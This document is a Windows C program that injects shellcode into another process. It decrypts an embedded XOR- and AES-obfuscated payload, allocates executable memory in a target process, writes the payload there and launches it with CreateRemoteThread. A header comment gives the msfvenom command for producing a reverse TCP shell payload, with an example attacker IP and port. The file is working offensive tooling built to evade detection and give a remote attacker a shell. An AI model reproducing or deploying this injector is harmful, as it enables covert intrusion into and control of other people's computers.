#include <stdio.h>
#include "aes.h"
#include <windows.h>
#include <tlhelp32.h>
#include <wchar.h>

// Use your shellcode : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your(attacker) IP address> LPORT=<Your(attacker) port number> -f c 
// Example			  : msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=5555 -f c

unsigned char key[] = { 'n', 'o', 't', 'a', 'k', 'e', 'y', 'o', 'f', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'i', 'o', 'n' };
unsigned char aesKey[] = "\x4d\xf7\xb9\xa7\xf0\xca\x4c\x08\xbc\xd2\x2b\xbc\xe7\xc0\x5b\x8b\xa4\x46\xcb\x6f\x9b\xc3\x74\x52\x96\x22\xa4\x18\x7d\xff\x97\xe0";
unsigned char aesiv[] = "\xa7\xae\xd8\xca\x15\x83\x3d\x33\x51\xa2\xa3\xf6\x6c\x69\x42\x79";

unsigned char shellcode[] = "\x3b\xde\xd2\x19\x9d\xbe\xba\xa4\x79\x55\x88\x34\xbb\xc5\x54\xa0\x2a\x8a\x66\x72\x25\x34\x71\x41\xa7\x64\x23\xc3\x62\xb4\xa4\xe9\xdb\x11\x13\xe2\x88\x1f\xfd\x79\xb0\xe0\x6f\x6e\x8b\x7e\xed\xfd\x26\xfa\x25\x6f\x20\x77\x75\xc2\x6b\x7d\x9e\x17\x44\x80\x23\x31\x71\xec\x92\xd3\x39\x39\xff\xeb\x61\x8a\x71\x43\x4f\x7d\x87\x3e\xb2\x95\x8c\x2f\xca\x01\x5e\xfb\xcc\xca\xb2\xdb\x5f\x4a\x0c\xfb\xb5\x89\x63\x1d\xc6\xad\x3a\xa0\x94\xeb\x29\x69\xf3\xd2\x75\xdc\x29\xa2\xb9\x06\x94\xc9\x0f\x41\xa3\x83\x6d\x02\x5b\xfb\x00\xf6\x7d\x61\x38\x07\x04\xf8\x7d\x7e\x6a\x1a\xe5\x56\xcb\xde\xf9\xa5\xd4\xeb\x5f\x7a\x2d\x4b\x79\x31\xce\xad\xae\x70\x3d\x39\xc9\x15\x28\x5a\xf2\xfa\xe2\x84\xd0\x46\x12\x13\x7e\x53\xf4\xfb\x88\x4a\x68\xdd\x9c\x45\x2b\x6e\x24\x02\x53\xfe\xb5\x63\xb9\x07\xba\x0e\xb0\xfc\x93\x80\xbe\xe5\xcb\x8c\x1a\x03\xe2\x2e\x7b\x8c\x7e\x63\xe7\x95\xeb\xe1\xe9\xd5\xf7\xeb\x44\xd3\x1e\x47\xd1\x14\xdd\x1f\x99\xb5\x41\xa3\x84\xad\x49\xbf\x8d\xbd\x7c\x8d\xee\xee\xfe\x8d\xc3\x73\xbd\x61\xcd\xa5\x28\x32\xc6\xf9\xb4\x49\xe0\x75\x57\x6b\xea\x88\x29\x61\x0a\x83\x79\x0c\x37\xfc\xb2\xd1\x11\x46\x1b\xec\xc5\xb3\x36\x63\x44\xe6\x99\xe2\x84\x84\x06\xed\x64\x2a\x1c\x54\x8b\xb5\xd7\xe3\xc9\x5a\x43\x94\x6a\x5f\x1f\x95\xc9\x24\xe1\xe4\xc1\xbf\x7b\xd2\xdd\x0d\x08\x64\x10\x84\x36\xd5\xb6\x42\x31\xce\x45\x57\x02\x5d\xd9\xde\xee\x58\xa1\x96\x72\xea\x09\x43\x95\x22\xc3\xd3\xd8\x77\x21\x88\x9d\xb9\xfa\xe3\x8a\x6a\x95\xed\x7c\x40\x11\x85\x13\xed\xe3\x61\x75\xc5\x77\x5c\x4f\x5d\xf0\xd2\xe0\xa1\x0a\x82\xd9\x12\xde\xc9\x43\xe3\xee\x80\xeb\xed\x3e\x2b\x54\x27\xf0\x38\xa0\xef\xd7\x37\x68\xbc\x5c\xa2\xc4\x04\x2d\x81\xe7\x1d\x5a\x93\x93\xca\xed\x0b\x67\xba\xdf\xdc\x27\x61\x37\xa3\xcd\x56\xfd\x12\x1b\x70\x06\x0d\x9b\x32\x37\x39\x93\xa7\x7e\xce\x1b\x75\xb2\x95\x18\x92\x58\xa1\x23\xf1\x9a\x3f\xea\x93\x9c\xd3\x67\xfe\xbc\xac\xb0\x7f\x22\xfd\xda\xe8\x29\xb0\xf2\x84\xaa";


void xorDecrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
    for (size_t i = 0; i < payload_len; ++i) {
        payload[i] ^= key[i % key_len];
    }
}

// Function to get the PID of a process by its name
DWORD getPid(const wchar_t* process) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD process_id = 0;

    // Take a snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[ERROR] CreateToolhelp32Snapshot failed [%d]\n", GetLastError());
        return 0;
    }

    // Initialize the PROCESSENTRY32 structure
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process
    if (!Process32FirstW(hSnapshot, &pe32)) {
        wprintf(L"[ERROR] Process32First failed [%d]\n", GetLastError());
        CloseHandle(hSnapshot); // clean the snapshot object
        return 0;
    }

    // Iterate through the snapshot to find the process
    do {
        //wprintf(L"Checking process: %s\n", pe32.szExeFile);
        if (_wcsicmp(pe32.szExeFile, process) == 0) {
            process_id = pe32.th32ProcessID;
            wprintf(L"Found process: %s with PID: %d\n", process, process_id);
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot); // clean the snapshot object
    return process_id;
}




int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        fwprintf(stderr, L"Usage: %s <process>\n", argv[0]);
        wprintf(L"\nExample: %s notepad.exe\n", argv[0]);
        return 1;
    }

   xorDecrypt(shellcode, sizeof(shellcode), key, sizeof(key));

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesiv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));

    // Get the process name from the command line arguments
    const wchar_t* process = argv[1];
    DWORD pid = getPid(process);
    if (pid == 0) {
        wprintf(L"Process %s not found.\n", process);
        return 1;
    }

    wprintf(L"[+] PID: %d\n", pid);

    // Open the target process with necessary permissions
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        wprintf(L"[ERROR] Could not open process [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] Process open successfully!\n");

    // Allocate memory for shellcode
    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pAddress == NULL) {
        wprintf(L"[ERROR] Could not allocate remote memory [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 100;
    }

    printf("[+] Memory allocated Successfully!\n");

    // Write the shellcode into memory
    if (WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), NULL) == 0) {
        wprintf(L"[ERROR] Could not write to remote memory [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 101;
    }

    printf("[+] Shellcode has been writen in the memory successfully!\n");

    // Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        wprintf(L"[ERROR] Could not create new thread [%d]\n", GetLastError());
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 102;
    }

    printf("[+] Remote has been created successfully!\n");

    // Wait for the remote thread to complete execution
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}